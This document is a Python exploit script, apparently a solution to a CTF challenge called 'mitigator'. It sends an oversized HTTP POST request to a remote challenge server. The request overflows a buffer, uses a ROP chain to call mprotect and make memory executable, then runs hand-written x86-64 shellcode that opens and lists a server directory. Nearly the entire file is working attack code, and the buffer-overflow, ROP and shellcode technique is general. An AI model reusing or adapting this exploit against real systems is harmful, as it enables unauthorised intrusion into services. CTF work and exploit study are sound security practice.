#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './http'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'mitigator.ctfcompetition.com', 'port':1337})
env.select()

#==========

binf = ELF(bin_file)
addr_path           = binf.symbols['path']
#addr_start_main     = binf.sep_function['generic_start_main']
addr_main           = binf.sep_function['main']
'''
addr_plt_puts       = binf.plt['puts']
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']
'''

#==========

def attack(conn):
    '''
    payload  = p64(addr_path + 0x18)
    payload += p64(addr_path + 0x18+0x28)
    payload += p64(0)
    payload += '/lib/x86_64-linux-gnu/ld-2.27.so'.ljust(0x28, '\x00')
    payload += '/proc/1/exe'
    '''
    #rop.execve(addr_path+0x18, addr_path, 0)

    rop = ROP(binf)
    rop.mprotect(addr_path & ~0xfff, 0x1000, constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC)

    shellasm  = '''
    xor rax, rax
    mov al, 2      
    lea rdi, [rip+dir]   
    xor rsi, rsi 
    xor rdx, rdx 
    syscall	

    mov rdi,rax 		
    xor rdx,rdx
    xor rax,rax
    mov dx, 0x3210 	
    sub rsp, rdx 	
    mov rsi, rsp 	
    mov al, 78 	
    syscall

    xchg rax,rdx

    xor rax, rax
    xor rdi,rdi
    
    inc eax
    inc edi
    mov rsi, rsp
    syscall

    xor rax, rax
    mov al, 60
    syscall

dir:
    .string "/home/user/www/cgi-bin"
    '''
    payload  = asm(shellasm)

    exploit  = 'POST /{path}? '.format(path=payload)
    exploit += 'a'*(0x408-1)
    exploit += p64(0xdeadbeef)
    exploit += str(rop)
    exploit += p64(addr_path)

    raw_input('>')
    conn.sendline(exploit)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
